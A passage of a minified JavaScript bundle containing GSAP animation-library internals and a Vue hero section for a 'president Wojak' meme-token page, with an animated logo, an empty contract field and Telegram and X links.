            (t[1] = ms[i] || i),
            t.join(" ")
        );
    },
    ea = function(e, t) {
        if (t.tween && t.tween._time === t.tween._dur) {
            var l,
                a,
                c,
                n = t.t,
                i = n.style,
                s = t.u,
                o = n._gsap;
            if ("all" === s || !0 === s) (i.cssText = ""), (a = 1);
            else
                for (c = (s = s.split(",")).length; --c > -1;)
                    (l = s[c]),
                        W1[l] && ((a = 1), (l = "transformOrigin" === l ? g1 : ke)),
                        cn(n, l);
            a &&
                (cn(n, ke),
                    o &&
                    (o.svg && n.removeAttribute("transform"),
                        fn(n, 1),
                        (o.uncache = 1),
                        y4(i)));
        }
    },
    o2 = {
        clearProps: function(e, t, n, i, s) {
            if ("isFromStart" !== s.data) {
                var o = (e._pt = new Ft(e._pt, t, n, 0, 0, ea));
                return (o.u = i), (o.pr = -10), (o.tween = s), e._props.push(n), 1;
            }
        },
    },
    un = [1, 0, 0, 1, 0, 0],
    C4 = {},
    S4 = function(e) {
        return "matrix(1, 0, 0, 1, 0, 0)" === e || "none" === e || !e;
    },
    xs = function(e) {
        var t = A1(e, ke);
        return S4(t) ? un : t.substr(7).match(D5).map(ze);
    },
    g6 = function(e, t) {
        var o,
            l,
            a,
            c,
            n = e._gsap || E3(e),
            i = e.style,
            s = xs(e);
        return n.svg && e.getAttribute("transform")
            ? "1,0,0,1,0,0" ===
                (s = [
                    (a = e.transform.baseVal.consolidate().matrix).a,
                    a.b,
                    a.c,
                    a.d,
                    a.e,
                    a.f,
                ]).join(",")
                ? un
                : s
            : (s === un &&
                !e.offsetParent &&
                e !== sr &&
                !n.svg &&
                ((a = i.display),
                    (i.display = "block"),
                    (!(o = e.parentNode) || !e.offsetParent) &&
                    ((c = 1), (l = e.nextElementSibling), sr.appendChild(e)),
                    (s = xs(e)),
                    a ? (i.display = a) : cn(e, "display"),
                    c &&
                    (l
                        ? o.insertBefore(e, l)
                        : o
                            ? o.appendChild(e)
                            : sr.removeChild(e))),
                t && s.length > 6 ? [s[0], s[1], s[4], s[5], s[12], s[13]] : s);
    },
    Ti = function(e, t, n, i, s, o) {
        var D,
            M,
            R,
            l = e._gsap,
            a = s || g6(e, !0),
            c = l.xOrigin || 0,
            u = l.yOrigin || 0,
            h = l.xOffset || 0,
            f = l.yOffset || 0,
            d = a[0],
            m = a[1],
            p = a[2],
            y = a[3],
            v = a[4],
            S = a[5],
            w = t.split(" "),
            C = parseFloat(w[0]) || 0,
            O = parseFloat(w[1]) || 0;
        n
            ? a !== un &&
            (M = d * y - m * p) &&
            ((R = C * (-m / M) + O * (d / M) - (d * S - m * v) / M),
                (C = C * (y / M) + O * (-p / M) + (p * S - y * v) / M),
                (O = R))
            : ((C = (D = w4(e)).x + (~w[0].indexOf("%") ? (C / 100) * D.width : C)),
                (O = D.y + (~(w[1] || w[0]).indexOf("%") ? (O / 100) * D.height : O))),
            i || (!1 !== i && l.smooth)
                ? ((v = C - c),
                    (S = O - u),
                    (l.xOffset = h + (v * d + S * p) - v),
                    (l.yOffset = f + (v * m + S * y) - S))
                : (l.xOffset = l.yOffset = 0),
            (l.xOrigin = C),
            (l.yOrigin = O),
            (l.smooth = !!i),
            (l.origin = t),
            (l.originIsAbsolute = !!n),
            (e.style[g1] = "0px 0px"),
            o &&
            (J1(o, l, "xOrigin", c, C),
                J1(o, l, "yOrigin", u, O),
                J1(o, l, "xOffset", h, l.xOffset),
                J1(o, l, "yOffset", f, l.yOffset)),
            e.setAttribute("data-svg-origin", C + " " + O);
    },
    fn = function(e, t) {
        var n = e._gsap || new a4(e);
        if ("x" in n && !t && !n.uncache) return n;
        var u,
            h,
            f,
            d,
            m,
            p,
            y,
            v,
            S,
            w,
            C,
            O,
            D,
            M,
            I,
            R,
            L,
            z,
            W,
            ue,
            te,
            J,
            U,
            Y,
            $,
            fe,
            b,
            Se,
            be,
            Ot,
            Ue,
            Qe,
            i = e.style,
            s = n.scaleX < 0,
            o = "px",
            l = "deg",
            a = getComputedStyle(e),
            c = A1(e, g1) || "0";
        return (
            (u = h = f = p = y = v = S = w = C = 0),
            (d = m = 1),
            (n.svg = !(!e.getCTM || !T4(e))),
            a.translate &&
            (("none" !== a.translate ||
                "none" !== a.scale ||
                "none" !== a.rotate) &&
                (i[ke] =
                    ("none" !== a.translate
                        ? "translate3d(" +
                        (a.translate + " 0 0").split(" ").slice(0, 3).join(", ") +
                        ") "
                        : "") +
                    ("none" !== a.rotate ? "rotate(" + a.rotate + ") " : "") +
                    ("none" !== a.scale
                        ? "scale(" + a.scale.split(" ").join(",") + ") "
                        : "") +
                    ("none" !== a[ke] ? a[ke] : "")),
                (i.scale = i.rotate = i.translate = "none")),
            (M = g6(e, n.svg)),
            n.svg &&
            (n.uncache
                ? (($ = e.getBBox()),
                    (c = n.xOrigin - $.x + "px " + (n.yOrigin - $.y) + "px"),
                    (Y = ""))
                : (Y = !t && e.getAttribute("data-svg-origin")),
                Ti(e, Y || c, !!Y || n.originIsAbsolute, !1 !== n.smooth, M)),
            (O = n.xOrigin || 0),
            (D = n.yOrigin || 0),
            M !== un &&
            ((z = M[0]),
                (W = M[1]),
                (ue = M[2]),
                (te = M[3]),
                (u = J = M[4]),
                (h = U = M[5]),
                6 === M.length
                    ? ((d = Math.sqrt(z * z + W * W)),
                        (m = Math.sqrt(te * te + ue * ue)),
                        (p = z || W ? Y3(W, z) * w3 : 0),
                        (S = ue || te ? Y3(ue, te) * w3 + p : 0) &&
                        (m *= Math.abs(Math.cos(S * or))),
                        n.svg && ((u -= O - (O * z + D * ue)), (h -= D - (O * W + D * te))))
                    : ((Qe = M[6]),
                        (Ot = M[7]),
                        (b = M[8]),
                        (Se = M[9]),
                        (be = M[10]),
                        (Ue = M[11]),
                        (u = M[12]),
                        (h = M[13]),
                        (f = M[14]),
                        (y = (I = Y3(Qe, be)) * w3),
                        I &&
                        ((Y = J * (R = Math.cos(-I)) + b * (L = Math.sin(-I))),
                            ($ = U * R + Se * L),
                            (fe = Qe * R + be * L),
                            (b = J * -L + b * R),
                            (Se = U * -L + Se * R),
                            (be = Qe * -L + be * R),
                            (Ue = Ot * -L + Ue * R),
                            (J = Y),
                            (U = $),
                            (Qe = fe)),
                        (v = (I = Y3(-ue, be)) * w3),
                        I &&
                        ((R = Math.cos(-I)),
                            (Ue = te * (L = Math.sin(-I)) + Ue * R),
                            (z = Y = z * R - b * L),
                            (W = $ = W * R - Se * L),
                            (ue = fe = ue * R - be * L)),
                        (p = (I = Y3(W, z)) * w3),
                        I &&
                        ((Y = z * (R = Math.cos(I)) + W * (L = Math.sin(I))),
                            ($ = J * R + U * L),
                            (W = W * R - z * L),
                            (U = U * R - J * L),
                            (z = Y),
                            (J = $)),
                        y &&
                        Math.abs(y) + Math.abs(p) > 359.9 &&
                        ((y = p = 0), (v = 180 - v)),
                        (d = ze(Math.sqrt(z * z + W * W + ue * ue))),
                        (m = ze(Math.sqrt(U * U + Qe * Qe))),
                        (I = Y3(J, U)),
                        (S = Math.abs(I) > 2e-4 ? I * w3 : 0),
                        (C = Ue ? 1 / (Ue < 0 ? -Ue : Ue) : 0)),
                n.svg &&
                ((Y = e.getAttribute("transform")),
                    (n.forceCSS = e.setAttribute("transform", "") || !S4(A1(e, ke))),
                    Y && e.setAttribute("transform", Y))),
            Math.abs(S) > 90 &&
            Math.abs(S) < 270 &&
            (s
                ? ((d *= -1), (S += p <= 0 ? 180 : -180), (p += p <= 0 ? 180 : -180))
                : ((m *= -1), (S += S <= 0 ? 180 : -180))),
            (t = t || n.uncache),
            (n.x =
                u -
                ((n.xPercent =
                    u &&
                    ((!t && n.xPercent) ||
                        (Math.round(e.offsetWidth / 2) === Math.round(-u) ? -50 : 0)))
                    ? (e.offsetWidth * n.xPercent) / 100
                    : 0) +
                o),
            (n.y =
                h -
                ((n.yPercent =
                    h &&
                    ((!t && n.yPercent) ||
                        (Math.round(e.offsetHeight / 2) === Math.round(-h) ? -50 : 0)))
                    ? (e.offsetHeight * n.yPercent) / 100
                    : 0) +
                o),
            (n.z = f + o),
            (n.scaleX = ze(d)),
            (n.scaleY = ze(m)),
            (n.rotation = ze(p) + l),
            (n.rotationX = ze(y) + l),
            (n.rotationY = ze(v) + l),
            (n.skewX = S + l),
            (n.skewY = w + l),
            (n.transformPerspective = C + o),
            (n.zOrigin = parseFloat(c.split(" ")[2]) || 0) && (i[g1] = l2(c)),
            (n.xOffset = n.yOffset = 0),
            (n.force3D = Wt.force3D),
            (n.renderTransform = n.svg ? ra : b4 ? A4 : ta),
            (n.uncache = 0),
            n
        );
    },
    l2 = function(e) {
        return (e = e.split(" "))[0] + " " + e[1];
    },
    U2 = function(e, t, n) {
        var i = pt(t);
        return ze(parseFloat(t) + parseFloat(u3(e, "x", n + "px", i))) + i;
    },
    ta = function(e, t) {
        (t.z = "0px"),
            (t.rotationY = t.rotationX = "0deg"),
            (t.force3D = 0),
            A4(e, t);
    },
    y3 = "0deg",
    Mr = "0px",
    v3 = ") ",
    A4 = function(e, t) {
        var n = t || this,
            i = n.xPercent,
            s = n.yPercent,
            o = n.x,
            l = n.y,
            a = n.z,
            c = n.rotation,
            u = n.rotationY,
            h = n.rotationX,
            f = n.skewX,
            d = n.skewY,
            m = n.scaleX,
            p = n.scaleY,
            y = n.transformPerspective,
            v = n.force3D,
            S = n.target,
            w = n.zOrigin,
            C = "",
            O = ("auto" === v && e && 1 !== e) || !0 === v;
        if (w && (h !== y3 || u !== y3)) {
            var R,
                D = parseFloat(u) * or,
                M = Math.sin(D),
                I = Math.cos(D);
            (D = parseFloat(h) * or),
                (R = Math.cos(D)),
                (o = U2(S, o, M * R * -w)),
                (l = U2(S, l, -Math.sin(D) * -w)),
                (a = U2(S, a, I * R * -w + w));
        }
        y !== Mr && (C += "perspective(" + y + v3),
            (i || s) && (C += "translate(" + i + "%, " + s + "%) "),
            (O || o !== Mr || l !== Mr || a !== Mr) &&
            (C +=
                a !== Mr || O
                    ? "translate3d(" + o + ", " + l + ", " + a + ") "
                    : "translate(" + o + ", " + l + v3),
            c !== y3 && (C += "rotate(" + c + v3),
            u !== y3 && (C += "rotateY(" + u + v3),
            h !== y3 && (C += "rotateX(" + h + v3),
            (f !== y3 || d !== y3) && (C += "skew(" + f + ", " + d + v3),
            (1 !== m || 1 !== p) && (C += "scale(" + m + ", " + p + v3),
            (S.style[ke] = C || "translate(0, 0)");
    },
    ra = function(e, t) {
        var O,
            D,
            M,
            I,
            R,
            n = t || this,
            i = n.xPercent,
            s = n.yPercent,
            o = n.x,
            l = n.y,
            a = n.rotation,
            c = n.skewX,
            u = n.skewY,
            h = n.scaleX,
            f = n.scaleY,
            d = n.target,
            m = n.xOrigin,
            p = n.yOrigin,
            y = n.xOffset,
            v = n.yOffset,
            S = n.forceCSS,
            w = parseFloat(o),
            C = parseFloat(l);
        (a = parseFloat(a)),
            (c = parseFloat(c)),
            (u = parseFloat(u)) && ((c += u = parseFloat(u)), (a += u)),
            a || c
                ? ((a *= or),
                    (c *= or),
                    (O = Math.cos(a) * h),
                    (D = Math.sin(a) * h),
                    (M = Math.sin(a - c) * -f),
                    (I = Math.cos(a - c) * f),
                    c &&
                    ((u *= or),
                        (R = Math.tan(c - u)),
                        (M *= R = Math.sqrt(1 + R * R)),
                        (I *= R),
                        u &&
                        ((R = Math.tan(u)), (O *= R = Math.sqrt(1 + R * R)), (D *= R))),
                    (O = ze(O)),
                    (D = ze(D)),
                    (M = ze(M)),
                    (I = ze(I)))
                : ((O = h), (I = f), (D = M = 0)),
            ((w && !~(o + "").indexOf("px")) || (C && !~(l + "").indexOf("px"))) &&
            ((w = u3(d, "x", o, "px")), (C = u3(d, "y", l, "px"))),
            (m || p || y || v) &&
            ((w = ze(w + m - (m * O + p * M) + y)),
                (C = ze(C + p - (m * D + p * I) + v))),
            (i || s) &&
            ((R = d.getBBox()),
                (w = ze(w + (i / 100) * R.width)),
                (C = ze(C + (s / 100) * R.height))),
            (R =
                "matrix(" + O + "," + D + "," + M + "," + I + "," + w + "," + C + ")"),
            d.setAttribute("transform", R),
            S && (d.style[ke] = R);
    },
    na = function(e, t, n, i, s) {
        var h,
            f,
            o = 360,
            l = it(s),
            c = parseFloat(s) * (l && ~s.indexOf("rad") ? w3 : 1) - i,
            u = i + c + "deg";
        return (
            l &&
            ("short" === (h = s.split("_")[1]) &&
                (c %= o) !== c % 180 &&
                (c += c < 0 ? o : -o),
                "cw" === h && c < 0
                    ? (c = ((c + o * ds) % o) - ~~(c / o) * o)
                    : "ccw" === h && c > 0 && (c = ((c - o * ds) % o) - ~~(c / o) * o)),
            (e._pt = f = new Ft(e._pt, t, n, i, c, $l)),
            (f.e = u),
            (f.u = "deg"),
            e._props.push(n),
            f
        );
    },
    ys = function(e, t) {
        for (var n in t) e[n] = t[n];
        return e;
    },
    ia = function(e, t, n) {
        var l,
            a,
            c,
            u,
            h,
            f,
            m,
            i = ys({}, n._gsap),
            o = n.style;
        for (a in (i.svg
            ? ((c = n.getAttribute("transform")),
                n.setAttribute("transform", ""),
                (o[ke] = t),
                (l = fn(n, 1)),
                cn(n, ke),
                n.setAttribute("transform", c))
            : ((c = getComputedStyle(n)[ke]),
                (o[ke] = t),
                (l = fn(n, 1)),
                (o[ke] = c)),
            W1))
            (c = i[a]) !== (u = l[a]) &&
                "perspective,force3D,transformOrigin,svgOrigin".indexOf(a) < 0 &&
                ((h = pt(c) !== (m = pt(u)) ? u3(n, a, c, m) : parseFloat(c)),
                    (f = parseFloat(u)),
                    (e._pt = new Ft(e._pt, l, a, h, f - h, vi)),
                    (e._pt.u = m || 0),
                    e._props.push(a));
        ys(l, i);
    };
Dt("padding,margin,Width,Radius", function(r, e) {
    var t = "Top",
        n = "Right",
        i = "Bottom",
        s = "Left",
        o = (e < 3 ? [t, n, i, s] : [t + s, t + n, i + n, i + s]).map(function(l) {
            return e < 2 ? r + l : "border" + l + r;
        });
    o2[e > 1 ? "border" + r : r] = function(l, a, c, u, h) {
        var f, d;
        if (arguments.length < 4)
            return (
                (f = o.map(function(m) {
                    return L1(l, m, c);
                })),
                5 === (d = f.join(" ")).split(f[0]).length ? f[0] : d
            );
        (f = (u + "").split(" ")),
            (d = {}),
            o.forEach(function(m, p) {
                return (d[m] = f[p] = f[p] || f[((p - 1) / 2) | 0]);
            }),
            l.init(a, d, h);
    };
});
var O4 = {
    name: "css",
    register: wi,
    targetTest: function(e) {
        return e.style && e.nodeType;
    },
    init: function(e, t, n, i, s) {
        var c,
            u,
            h,
            f,
            d,
            m,
            p,
            y,
            v,
            S,
            w,
            C,
            O,
            D,
            M,
            I,
            o = this._props,
            l = e.style,
            a = n.vars.startAt;
        for (p in (d6 || wi(),
            (this.styles = this.styles || v4(e)),
            (I = this.styles.props),
            (this.tween = n),
            t))
            if ("autoRound" !== p && ((u = t[p]), !Zt[p] || !c4(p, t, n, i, e, s)))
                if (
                    ((d = typeof u),
                        (m = o2[p]),
                        "function" === d && (d = typeof (u = u.call(n, i, e, s))),
                        "string" === d && ~u.indexOf("random(") && (u = ln(u)),
                        m)
                )
                    m(this, e, p, u, n) && (M = 1);
                else if ("--" === p.substr(0, 2))
                    (c = (getComputedStyle(e).getPropertyValue(p) + "").trim()),
                        (u += ""),
                        (o3.lastIndex = 0),
                        o3.test(c) || ((y = pt(c)), (v = pt(u))),
                        v ? y !== v && (c = u3(e, p, c, v) + v) : y && (u += y),
                        this.add(l, "setProperty", c, u, i, s, 0, 0, p),
                        o.push(p),
                        I.push(p, 0, l[p]);
                else if ("undefined" !== d) {
                    if (
                        (a && p in a
                            ? ((c = "function" == typeof a[p] ? a[p].call(n, i, e, s) : a[p]),
                                it(c) && ~c.indexOf("random(") && (c = ln(c)),
                                pt(c + "") || (c += Wt.units[p] || pt(L1(e, p)) || ""),
                                "=" === (c + "").charAt(1) && (c = L1(e, p)))
                            : (c = L1(e, p)),
                            (f = parseFloat(c)),
                            (S = "string" === d && "=" === u.charAt(1) && u.substr(0, 2)) &&
                            (u = u.substr(2)),
                            (h = parseFloat(u)),
                            p in Z1 &&
                            ("autoAlpha" === p &&
                                (1 === f && "hidden" === L1(e, "visibility") && h && (f = 0),
                                    I.push("visibility", 0, l.visibility),
                                    J1(
                                        this,
                                        l,
                                        "visibility",
                                        f ? "inherit" : "hidden",
                                        h ? "inherit" : "hidden",
                                        !h
                                    )),
                                "scale" !== p &&
                                "transform" !== p &&
                                ~(p = Z1[p]).indexOf(",") &&
                                (p = p.split(",")[0])),
                            (w = p in W1))
                    )
                        if (
                            (this.styles.save(p),
                                C ||
                                (((O = e._gsap).renderTransform && !t.parseTransform) ||
                                    fn(e, t.parseTransform),
                                    (D = !1 !== t.smoothOrigin && O.smooth),
                                    ((C = this._pt =
                                        new Ft(
                                            this._pt,
                                            l,
                                            ke,
                                            0,
                                            1,
                                            O.renderTransform,
                                            O,
                                            0,
                                            -1
                                        )).dep = 1)),
                                "scale" === p)
                        )
                            (this._pt = new Ft(
                                this._pt,
                                O,
                                "scaleY",
                                O.scaleY,
                                (S ? ir(O.scaleY, S + h) : h) - O.scaleY || 0,
                                vi
                            )),
                                (this._pt.u = 0),
                                o.push("scaleY", p),
                                (p += "X");
                        else {
                            if ("transformOrigin" === p) {
                                I.push(g1, 0, l[g1]),
                                    (u = Jl(u)),
                                    O.svg
                                        ? Ti(e, u, 0, D, 0, this)
                                        : ((v = parseFloat(u.split(" ")[2]) || 0) !== O.zOrigin &&
                                            J1(this, O, "zOrigin", O.zOrigin, v),
                                            J1(this, l, p, l2(c), l2(u)));
                                continue;
                            }
                            if ("svgOrigin" === p) {
                                Ti(e, u, 1, D, 0, this);
                                continue;
                            }
                            if (p in C4) {
                                na(this, O, p, f, S ? ir(f, S + u) : u);
                                continue;
                            }
                            if ("smoothOrigin" === p) {
                                J1(this, O, "smooth", O.smooth, u);
                                continue;
                            }
                            if ("force3D" === p) {
                                O[p] = u;
                                continue;
                            }
                            if ("transform" === p) {
                                ia(this, u, e);
                                continue;
                            }
                        }
                    else p in l || (p = xr(p) || p);
                    if (w || ((h || 0 === h) && (f || 0 === f) && !Zl.test(u) && p in l))
                        h || (h = 0),
                            (y = (c + "").substr((f + "").length)) !==
                            (v = pt(u) || (p in Wt.units ? Wt.units[p] : y)) &&
                            (f = u3(e, p, c, v)),
                            (this._pt = new Ft(
                                this._pt,
                                w ? O : l,
                                p,
                                f,
                                (S ? ir(f, S + h) : h) - f,
                                w || ("px" !== v && "zIndex" !== p) || !1 === t.autoRound
                                    ? vi
                                    : Ul
                            )),
                            (this._pt.u = v || 0),
                            y !== v && "%" !== v && ((this._pt.b = c), (this._pt.r = zl));
                    else if (p in l) Gl.call(this, e, p, c, S ? S + u : u);
                    else if (p in e) this.add(e, p, c || e[p], S ? S + u : u, i, s);
                    else if ("parseTransform" !== p) {
                        i6(p, u);
                        continue;
                    }
                    w || (p in l ? I.push(p, 0, l[p]) : I.push(p, 1, c || e[p])),
                        o.push(p);
                }
        M && p4(this);
    },
    render: function(e, t) {
        if (t.tween._time || !_6())
            for (var n = t._pt; n;) n.r(e, n.d), (n = n._next);
        else t.styles.revert();
    },
    get: L1,
    aliases: Z1,
    getSetter: function(e, t, n) {
        var i = Z1[t];
        return (
            i && i.indexOf(",") < 0 && (t = i),
            t in W1 && t !== g1 && (e._gsap.x || L1(e, "x"))
                ? n && hs === n
                    ? "scale" === t
                        ? Xl
                        : Yl
                    : (hs = n || {}) && ("scale" === t ? Vl : jl)
                : e.style && !r6(e.style[t])
                    ? Wl
                    : ~t.indexOf("-")
                        ? Hl
                        : f6(e, t)
        );
    },
    core: { _removeProperty: cn, _getMatrix: g6 },
};
(Xt.utils.checkPrefix = xr),
    (Xt.core.getStyleSaver = v4),
    (function(r, e, t, n) {
        var i = Dt(
            r +
            "," +
            e +
            ",transform,transformOrigin,svgOrigin,force3D,smoothOrigin,transformPerspective",
            function(s) {
                W1[s] = 1;
            }
        );
        Dt(e, function(s) {
            (Wt.units[s] = "deg"), (C4[s] = 1);
        }),
            (Z1[i[13]] = r + "," + e),
            Dt(
                "0:translateX,1:translateY,2:translateZ,8:rotate,8:rotationZ,8:rotateZ,9:rotateX,10:rotateY",
                function(s) {
                    var o = s.split(":");
                    Z1[o[1]] = i[o[0]];
                }
            );
    })(
        "x,y,z,scale,scaleX,scaleY,xPercent,yPercent",
        "rotation,rotationX,rotationY,skewX,skewY"
    ),
    Dt(
        "x,y,z,top,right,bottom,left,width,height,fontSize,padding,margin,perspective",
        function(r) {
            Wt.units[r] = "px";
        }
    ),
    Xt.registerPlugin(O4);
var Ut = Xt.registerPlugin(O4) || Xt;
Ut.core.Tween;
const sa =
    "data:image/png;base64,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",
    U3 = (r, e) => {
        const t = r.__vccOpts || r;
        for (const [n, i] of e) t[n] = i;
        return t;
    },
    oa = $3({
        name: "HeroSection",
        setup: () => (
            d3(() => {
                Ut.fromTo(
                    ".broke-text-logo",
                    { opacity: 0 },
                    { opacity: 1, duration: 1 }
                ),
                    Ut.fromTo(
                        ".btns-wrapper",
                        { opacity: 0 },
                        { opacity: 1, duration: 1 }
                    ),
                    Ut.fromTo(
                        ".down-btn",
                        { y: 0 },
                        { y: 5, repeat: -1, duration: 1, ease: "power2" }
                    ),
                    Ut.fromTo(
                        ".down-btn",
                        { y: 5 },
                        { y: 0, repeat: -1, duration: 1, ease: "power2" }
                    );
            }),
            {
                navigate: (e) => {
                    window.open(e, "_blank");
                },
            }
        ),
    }),
    m6 = (r) => (Tr("data-v-e6c3a09c"), (r = r()), Cr(), r),
    la = { class: "hero-section w-full relative", style:"height:70vh;"},
    aa = m6(() =>
        // me("div", { class: "video-wrapper" }, [
        //     me("img", { src: "", style:"width:50%; height:500px;"})
        // ]),
        me( 
            "nav",
            { class: "p-4" },
            [ ],
            [
                me("div", { class: "flex items-center" }, [
                    me("img", { src: "", class: "broke-logo" }),
                ]),
            ],
            -1
        )
    ),
    ca = { class: "hero-content flex items-center justify-center" },
    ua = { class: "flex flex-col items-center"},
    fa = m6(() => me(
        "img", {
            src: "https://ucarecdn.com/9ebc0520-a6d3-48fe-9828-8cb70d0bf319/photo_20240813_003604.jpg", class: "left-0 right-0 mr-auto ml-auto responsive-image"
        },
        "h1", {
        class: "broke-text-logo", style: "font-size:5rem;color:red;"
    }, "president Wojak  ", -1)),
    hey = m6(() => me("h3", { class: "broke-text-logo" }, "Contract :   ", -1)),

    ha = { class: "btns-wrapper" },
    da = m6(() =>
        me(
            "button",
            { class: "down-btn absolute bottom-[2%] left-0 right-0 mr-auto ml-auto", style:"color:red;"},
            "",
            -1
        )
    );
function _a(r, e, t, n, i, s) {
    return (
        p1(),
        Y1("section", la, [
            aa,
            me("div", ca, [
                me("div", ua, [
                    fa,
                    me("div", {
                        style: "display: flex; justify-content: space-between; align-items: center; gap: 2rem;"
                    }, [
                        me("i", {
                            class: "fab fa-telegram",
                            style: "color: red; font-size: 40px; cursor: pointer;",
                            onClick: e[2] || (e[2] = (o) => r.navigate("https://t.me/PresidentWojak"))
                        }),
                        me("img", {
                            src: "https://images.seeklogo.com/logo-png/52/1/dex-screener-logo-png_seeklogo-527276.png",
                            style: "width: 50px; cursor: pointer; border-radius:50%;",
                            class: "left-0 right-0 mr-auto ml-auto",
                            onClick: e[3] || (e[3] = (o) => r.navigate(""))
                        }),
                        me("i", {
                            class: "fab fa-twitter",
                            style: "color: red; font-size: 40px; cursor: pointer;",
                            onClick: e[3] || (e[3] = (o) => r.navigate("https://x.com/presidentwojak"))
                        })
                        
                    ]),
                ]),
            ]),
            da,
        ])
    );
}
const pa = U3(oa, [
    ["render", _a],
    ["__scopeId", "data-v-e6c3a09c"],
]);
function vs(r, e) {
    for (var t = 0; t < e.length; t++) {
        var n = e[t];
        (n.enumerable = n.enumerable || !1),
            (n.configurable = !0),
            "value" in n && (n.writable = !0),
            Object.defineProperty(r, n.key, n);
    }
}
function ga(r, e, t) {
    return e && vs(r.prototype, e), t && vs(r, t), r;
}
var ut,
    Ci,
    zt,
    e3,
    t3,
    lr,
    P4,
    T3,
    Hr,
    M4,
    $1,
    o1,
    E4,
    k4 = function() {
        return (
            ut ||
            (typeof window < "u" && (ut = window.gsap) && ut.registerPlugin && ut)
        );
    },
    R4 = 1,
    J3 = [],
    ce = [],
    O1 = [],
    Yr = Date.now,
    Si = function(e, t) {
        return t;
    },
    ma = function() {
        var e = Hr.core,
            t = e.bridge || {},
            n = e._scrollers,
            i = e._proxies;
        n.push.apply(n, ce),
            i.push.apply(i, O1),
            (ce = n),
            (O1 = i),
            (Si = function(o, l) {
                return t[o](l);
            });
    },
    l3 = function(e, t) {
        return ~O1.indexOf(e) && O1[O1.indexOf(e) + 1][t];
    },
    Xr = function(e) {
        return !!~M4.indexOf(e);
    },
    Mt = function(e, t, n, i, s) {
        return e.addEventListener(t, n, { passive: !i, capture: !!s });
    },
    yt = function(e, t, n, i) {
        return e.removeEventListener(t, n, !!i);
    },
    wn = "scrollLeft",
    Tn = "scrollTop",
    Ai = function() {
        return ($1 && $1.isPressed) || ce.cache++;
    },
    a2 = function(e, t) {
        var n = function i(s) {
            if (s || 0 === s) {
                R4 && (zt.history.scrollRestoration = "manual");
                var o = $1 && $1.isPressed;
                (s = i.v = Math.round(s) || ($1 && $1.iOS ? 1 : 0)),
                    e(s),
                    (i.cacheID = ce.cache),
                    o && Si("ss", s);
            } else
                (t || ce.cache !== i.cacheID || Si("ref")) &&
                    ((i.cacheID = ce.cache), (i.v = e()));
            return i.v + i.offset;
        };
        return (n.offset = 0), e && n;
    },
    Ct = {
        s: wn,
        p: "left",
        p2: "Left",
